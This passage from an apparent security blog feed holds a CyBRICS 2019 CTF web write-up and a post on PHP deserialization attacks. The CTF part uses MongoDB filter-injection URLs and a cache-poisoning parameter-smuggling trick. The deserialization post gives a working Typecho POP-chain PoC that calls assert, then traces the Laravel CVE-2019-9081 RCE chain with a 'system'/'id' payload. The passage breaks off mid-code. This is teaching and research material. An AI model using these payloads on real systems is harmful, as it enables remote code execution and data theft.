class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://173.199.118.226/index.php?filter[$cond][if][$eq][]=flags&amp;filter[$cond][if][$eq][]=$category&amp;filter[$cond][then]=$$REMOVE&amp;filter[$cond][else]=$category</span><br></pre></td></tr></table></figure></p><p>发现flags被移除：<br><img src="/images/2019-07-22-10-24-54.png" alt=""><br>在匹配到public时，将其移除：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://173.199.118.226/index.php?filter[$cond][if][$eq][]=public&amp;filter[$cond][if][$eq][]=$category&amp;filter[$cond][then]=$$REMOVE&amp;filter[$cond][else]=$category</span><br></pre></td></tr></table></figure></p><p>发现此时正常：<br><img src="/images/2019-07-22-10-31-15.png" alt=""><br>那么利用条件语句，发现flags时，就输出其title：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://173.199.118.226/index.php?filter[$cond][if][$eq][]=flags&amp;filter[$cond][if][$eq][]=$category&amp;filter[$cond][then]=$title&amp;filter[$cond][else]=$category</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-07-22-10-23-54.png" alt=""><br>从title中我们得知有text，那么读取：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://173.199.118.226/index.php?filter[$cond][if][$eq][]=flags&amp;filter[$cond][if][$eq][]=$category&amp;filter[$cond][then]=$text&amp;filter[$cond][else]=$category</span><br></pre></td></tr></table></figure></p><p>即可拿到flag:<br><img src="/images/2019-07-22-10-23-12.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cybrics&#123;7|-|15 15 4 7E&gt;&lt;7 |=|_49&#125;</span><br></pre></td></tr></table></figure></p><h2 id="Fixaref"><a href="#Fixaref" class="headerlink" title="Fixaref"></a>Fixaref</h2><p>进入页面后，发现可以ask question，本能测试一下远程请求：<br><img src="/images/2019-07-22-10-15-13.png" alt=""><br>收到后，发现是python requests发包，同时注意到http header:<br><img src="/images/2019-07-22-11-10-02.png" alt=""><br>发现了一个奇怪的header，搜索得知，可能和缓存有关，同时依据之前非预期的题目的flag提示：cache is vulnerabilities。那么判定本题应该是利用cache的问题。<br>我们测试让题目自己去访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://95.179.190.31/index.php/skyiscool.js</span><br></pre></td></tr></table></figure></p><p>发现可以管理员的页面：<br><img src="/images/2019-07-22-10-16-35.png" alt=""><br><img src="/images/2019-07-22-10-16-56.png" alt=""><br>那么本能想要拿出flag，测试让题目去请求：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://95.179.190.31/index.php/skyiscool.js?csrf-token=b04d2bc2f3d3654947ba82d59a2b367630743d3447dbc0af46182359f166c4bd&amp;flag=1</span><br></pre></td></tr></table></figure></p><p>但发现我们的flag参数被丢弃：<br><img src="/images/2019-07-22-10-19-18.png" alt=""><br>为了探测他的过滤规则，那么构造如下请求：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://1.1.1.1/?a=1&amp;b=2</span><br></pre></td></tr></table></figure></p><p>发现b参数被丢弃：<br><img src="/images/2019-07-22-10-13-43.png" alt=""><br>那么初步判断校验标准应该是只允许传入1个参数，那么思考如何判断参数个数？<br>这里猜测可能是利用&amp;，那么我们尝试把&amp;编码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://1.1.1.1/?a=1%26b=2</span><br></pre></td></tr></table></figure></p><p>发现成功：<br><img src="/images/2019-07-22-10-14-11.png" alt=""><br>那么使用如下exp，让题目请求：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://95.179.190.31/index.php/skyiscool.js?csrf-token=b04d2bc2f3d3654947ba82d59a2b367630743d3447dbc0af46182359f166c4bd%26flag=1</span><br></pre></td></tr></table></figure></p><p>发现此时已经带有flag参数：<br><img src="/images/2019-07-22-10-17-55.png" alt=""><br>访问cache页面，拿到flag：<br><img src="/images/2019-07-22-10-18-25.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cybrics&#123;Bu9s_C4N_83_uN1N73Nd3D!&#125;</span><br></pre></td></tr></table></figure></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这次2019 CyBRICS CTF Quals的Web方向题目并不困难，相比WCTF LCBC的Web题，还是后者更有趣XD~</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发于嘶吼 https://www.4hou.com/web/19354.html</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;周末参加了LCBC主办的2019 CyBRICS CTF Quals，在金砖五国中，获得了top5的成绩，以下是web的题解。&lt;/p&gt;
&lt;h
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Summary of serialization attacks Part 3</title>
    <link href="http://skysec.top/2019/07/18/Summary-of-serialization-attacks-Part-3/"/>
    <id>http://skysec.top/2019/07/18/Summary-of-serialization-attacks-Part-3/</id>
    <published>2019-07-18T07:30:36.000Z</published>
    <updated>2019-08-02T08:20:55.162Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>接之前的两篇文章：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.4hou.com/web/17835.html</span><br><span class="line">https://www.4hou.com/web/17976.html</span><br></pre></td></tr></table></figure></p><p>之前分别介绍了php序列化攻击的魔法方法、session序列化引擎以及原生类序列化问题。<br>本篇文章则主要从真实案例来看序列化的pop链构造。</p><h2 id="typecho序列化"><a href="#typecho序列化" class="headerlink" title="typecho序列化"></a>typecho序列化</h2><p>这一节就简单说一下构造链，因为之前的文章分析过，可详见：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://skysec.top/2017/12/29/cms%E5%B0%8F%E7%99%BD%E5%AE%A1%E8%AE%A1-typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/</span><br></pre></td></tr></table></figure></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>1.找到入手点__typecho_config：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$config = unserialize(base64_decode(Typecho_Cookie::get(&apos;__typecho_config&apos;)));</span><br></pre></td></tr></table></figure></p><p>2.寻找可用类Typecho_Db:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$db = new Typecho_Db($config[&apos;adapter&apos;], $config[&apos;prefix&apos;]);</span><br></pre></td></tr></table></figure></p><p>3.利用Typecho_Feed魔法方法__toString()：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$config[<span class="string">'adapter'</span>] =&gt; <span class="keyword">new</span> Typecho_Feed()</span><br><span class="line"></span><br><span class="line">class Typecho_Feed __toString()</span><br></pre></td></tr></table></figure></p><p>4.利用Typecho_Request魔法方法__get()：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$item[<span class="string">'author'</span>]-&gt;screenName</span><br><span class="line"></span><br><span class="line">class Typecho_Request  __get()</span><br></pre></td></tr></table></figure></p><p>5.利用get()方法，完成利用链：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get() -&gt; _applyFilter() -&gt; call_user_func</span><br></pre></td></tr></table></figure></p><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_type=<span class="string">'ATOM 1.0'</span>;</span><br><span class="line">    <span class="keyword">private</span> $_items;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_items = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'0'</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                <span class="string">'author'</span>=&gt; <span class="keyword">new</span> Typecho_Request())</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_params = <span class="keyword">array</span>(<span class="string">'screenName'</span>=&gt;<span class="string">'phpinfo()'</span>);</span><br><span class="line">    <span class="keyword">private</span> $_filter = <span class="keyword">array</span>(<span class="string">'assert'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$poc = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">'adapter'</span>=&gt;<span class="keyword">new</span> Typecho_Feed(),</span><br><span class="line"><span class="string">'prefix'</span>=&gt;<span class="string">'typecho'</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($poc));</span><br></pre></td></tr></table></figure><h2 id="laravel序列化"><a href="#laravel序列化" class="headerlink" title="laravel序列化"></a>laravel序列化</h2><p>Laravel是一套简洁、优雅的PHP Web开发框架(PHP Web Framework)，若其本身出现漏洞，则对使用响应框架开发的网站影响是致命的。而这里就将分析laravel框架序列化RCE，CVE编号：CVE-2019-9081，受影响范围：laravel &gt;= 5.7。</p><h3 id="类名加载"><a href="#类名加载" class="headerlink" title="类名加载"></a>类名加载</h3><p>我们首先随便构造一段序列化：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sky</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $sky=<span class="string">'test'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$sky = <span class="keyword">new</span> sky();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($sky));</span><br><span class="line"></span><br><span class="line"><span class="comment"># O%3A3%3A%22sky%22%3A1%3A%7Bs%3A3%3A%22sky%22%3Bs%3A4%3A%22test%22%3B%7D</span></span><br></pre></td></tr></table></figure></p><p>我们传入laravel，并进行反序列化，可以看到load方法试图加载我们随便输入的sky类，首先在$facadeNamespace中寻找指定类名：<br><img src="/images/2019-07-18-16-14-05.png" alt=""><img src="/images/2019-07-18-16-14-16.png" alt=""><br>如果找到，则会通过loadFacade进行加载，否则则进入loadClass进行class map查找，在vendor目录下寻找所需类：<br><img src="/images/2019-07-18-16-04-45.png" alt=""><br><img src="/images/2019-07-18-16-18-25.png" alt=""><br>但是并不能找到sky类，最后会return false。<br>最后查看是否class名以Swift_开头：<br><img src="/images/2019-07-18-16-06-04.png" alt=""><br>最后因为找不到对应类的定义，所以并不能成功进入反序列化流程。<br>但如果我们用一个存在的类，可以明显发现在findFile函数的classMap中找到了相关类，并返回进行了include：<br><img src="/images/2019-07-18-16-35-36.png" alt=""><br><img src="/images/2019-07-18-16-36-22.png" alt=""></p><h3 id="危险类挖掘"><a href="#危险类挖掘" class="headerlink" title="危险类挖掘"></a>危险类挖掘</h3><p>挖掘一个框架的新漏洞，从框架新加入的代码入手是一个很好的思路。我们注意到laravel在5.7之后加入了PendingCommand:<br><img src="/images/2019-07-18-16-44-20.png" alt=""><br>值得注意的是，我们查到该文件，其定义了PendingCommand类，同时注意到其两个方法：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Execute the command.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> int</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">execute</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Handle the object's destruction.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;hasExecuted) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>非常有意思的是，该类有魔法方法__destruct，而该魔法方法会调用run函数，而run函数可以进行执行命令。<br>我们查看其构造方式:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($command, $parameters,$class,$app)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;command = $command;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;parameters = $parameters;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test=$class;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;app=$app;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>一共需要用到4个属性，我们查阅对应手册：<br><img src="/images/2019-07-18-19-03-19.png" alt=""></p><h3 id="run-amp-mockConsoleOutput"><a href="#run-amp-mockConsoleOutput" class="headerlink" title="run &amp; mockConsoleOutput"></a>run &amp; mockConsoleOutput</h3><p>我们跟进run方法：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hasExecuted = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mockConsoleOutput();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            $exitCode = <span class="keyword">$this</span>-&gt;app[Kernel::class]-&gt;call(<span class="keyword">$this</span>-&gt;command, <span class="keyword">$this</span>-&gt;parameters);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoMatchingExpectationException $e) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($e-&gt;getMethodName() === <span class="string">'askQuestion'</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;test-&gt;fail(<span class="string">'Unexpected question "'</span>.$e-&gt;getActualArguments()[<span class="number">0</span>]-&gt;getQuestion().<span class="string">'" was asked.'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">throw</span> $e;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;expectedExitCode !== <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test-&gt;assertEquals(</span><br><span class="line">                <span class="keyword">$this</span>-&gt;expectedExitCode, $exitCode,</span><br><span class="line">                <span class="string">"Expected status code &#123;$this-&gt;expectedExitCode&#125; but received &#123;$exitCode&#125;."</span></span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $exitCode;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>关注到第一个关键点：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;mockConsoleOutput();</span><br></pre></td></tr></table></figure></p><p>我们跟进该函数：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">mockConsoleOutput</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $mock = Mockery::mock(OutputStyle::class.<span class="string">'[askQuestion]'</span>, [</span><br><span class="line">            (<span class="keyword">new</span> ArrayInput(<span class="keyword">$this</span>-&gt;parameters)), <span class="keyword">$this</span>-&gt;createABufferedOutputMock(),</span><br><span class="line">        ]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;test-&gt;expectedQuestions <span class="keyword">as</span> $i =&gt; $question) &#123;</span><br><span class="line">            $mock-&gt;shouldReceive(<span class="string">'askQuestion'</span>)</span><br><span class="line">                -&gt;once()</span><br><span class="line">                -&gt;ordered()</span><br><span class="line">                -&gt;with(Mockery::on(<span class="function"><span class="keyword">function</span> <span class="params">($argument)</span> <span class="title">use</span> <span class="params">($question)</span> </span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> $argument-&gt;getQuestion() == $question[<span class="number">0</span>];</span><br><span class="line">                &#125;))</span><br><span class="line">                -&gt;andReturnUsing(<span class="function"><span class="keyword">function</span> <span class="params">()</span> <span class="title">use</span> <span class="params">($question, $i)</span> </span>&#123;</span><br><span class="line">                    <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;test-&gt;expectedQuestions[$i]);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> $question[<span class="number">1</span>];</span><br><span class="line">                &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;app-&gt;bind(OutputStyle::class, <span class="function"><span class="keyword">function</span> <span class="params">()</span> <span class="title">use</span> <span class="params">($mock)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> $mock;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>首先是第一步：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$mock = Mockery::mock(OutputStyle::class.<span class="string">'[askQuestion]'</span>, [</span><br><span class="line">            (<span class="keyword">new</span> ArrayInput(<span class="keyword">$this</span>-&gt;parameters)), <span class="keyword">$this</span>-&gt;createABufferedOutputMock(),</span><br><span class="line">        ]);</span><br></pre></td></tr></table></figure></p><p>我们跟进createABufferedOutputMock:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">createABufferedOutputMock</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $mock = Mockery::mock(BufferedOutput::class.<span class="string">'[doWrite]'</span>)</span><br><span class="line">                -&gt;shouldAllowMockingProtectedMethods()</span><br><span class="line">                -&gt;shouldIgnoreMissing();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;test-&gt;expectedOutput <span class="keyword">as</span> $i =&gt; $output) &#123;</span><br><span class="line">            $mock-&gt;shouldReceive(<span class="string">'doWrite'</span>)</span><br><span class="line">                -&gt;once()</span><br><span class="line">                -&gt;ordered()</span><br><span class="line">                -&gt;with($output, Mockery::any())</span><br><span class="line">                -&gt;andReturnUsing(<span class="function"><span class="keyword">function</span> <span class="params">()</span> <span class="title">use</span> <span class="params">($i)</span> </span>&#123;</span><br><span class="line">                    <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;test-&gt;expectedOutput[$i]);</span><br><span class="line">                &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $mock;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>这里如果想继续走下去，我们需要属性$this-&gt;test-&gt;expectedOutput<br><img src="/images/2019-07-18-17-12-55.png" alt=""><br>那么有没有类有expectedOutput呢？我们全局搜索，发现在Illuminate\Foundation\Testing\Concerns中存在这样的属性。<br>但这样的类很难被实例化，无法走通后面的路。但此时我们可以巧用魔法方法<strong>get：当我们试图获取一个不可达属性，类会自动调用</strong>get函数。<br>我们找到如下类：<br>vendor/laravel/framework/src/Illuminate/Auth/GenericUser.php<br><img src="/images/2019-07-18-17-13-51.png" alt=""><br>可以使用我们经常使用的小trick，设置键名为expectedOutput的数组，即可利用。<br>然后是第二步：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;test-&gt;expectedQuestions <span class="keyword">as</span> $i =&gt; $question)</span><br></pre></td></tr></table></figure></p><p>此处依旧可以使用__get方法，定义键名为expectedQuestions的数组即可。</p><h3 id="run-amp-实例化对象"><a href="#run-amp-实例化对象" class="headerlink" title="run &amp; 实例化对象"></a>run &amp; 实例化对象</h3><p>到此为止，我们已经能构造出PendingCommand前3个参数的值了：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$test = <span class="keyword">new</span> Illuminate\Auth\GenericUser(</span><br><span class="line">    <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">"expectedOutput"</span>=&gt;<span class="keyword">array</span>(<span class="string">"0"</span>=&gt;<span class="string">"1"</span>),</span><br><span class="line">                <span class="string">"expectedQuestions"</span>=&gt;<span class="keyword">array</span>(<span class="string">"0"</span>=&gt;<span class="string">"1"</span>)</span><br><span class="line">         )</span><br><span class="line">);</span><br><span class="line">$command = <span class="string">"system"</span>;</span><br><span class="line">$parameters = <span class="keyword">array</span>(<span class="string">'id'</span>);</span><br></pre></td></tr></table></figure></p><p>那么最后一个参数$app同样尤为关键，我们继续跟进run的代码，来到关键第三步：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$exitCode = <span class="keyword">$this</span>-&gt;app[Kernel::class]-&gt;call(<span class="keyword">$this</span>-&gt;command, <span class="keyword">$this</span>-&gt;parameters);</span><br></pre></td></tr></table></figure></p><p>我们跟入这一句，可以发现，首先代码在实例化对象：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;app[Kernel::class]</span><br></pre></td></tr></table></figure></p><p>然后再去调对应的call方法，那么跟入不难发现，其想要实例化的对象是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Illuminate\Contracts\Console\Kernel</span><br></pre></td></tr></table></figure></p><p>首先进入：<br><img src="/images/2019-07-18-19-16-16.png" alt=""><br>跟进make:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">make</span><span class="params">($abstract, array $parameters = [])</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $abstract = <span class="keyword">$this</span>-&gt;getAlias($abstract);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;deferredServices[$abstract]) &amp;&amp; ! <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;instances[$abstract])) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;loadDeferredProvider($abstract);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">parent</span>::make($abstract, $parameters);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>再跟进其父类的make:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">make</span><span class="params">($abstract, array $parameters = [])</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resolve($abstract, $parameters);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>跟进resolve：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">$concrete = <span class="keyword">$this</span>-&gt;getConcrete($abstract);</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p><p>那么此时发现$concrete的值来自于getConcrete($abstract):<br>vendor/laravel/framework/src/Illuminate/Container/Container.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$concrete = <span class="keyword">$this</span>-&gt;getConcrete($abstract);</span><br></pre></td></tr></table></figure></p><p>跟进getConcrete：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getConcrete</span><span class="params">($abstract)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (! 